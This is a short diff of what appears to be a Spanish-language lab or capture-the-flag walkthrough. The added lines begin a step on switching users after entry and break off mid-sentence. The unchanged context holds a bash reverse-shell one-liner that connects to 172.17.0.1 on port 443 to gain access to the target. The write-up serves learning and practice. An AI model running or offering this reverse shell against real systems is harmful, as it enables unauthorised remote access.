@@ -73,5 +73,7 @@ bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 
 Y finalmente tendremos acceso a la máquina.
 
+## Paso N6: Cambiando de usuarios
+Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que 
 
 
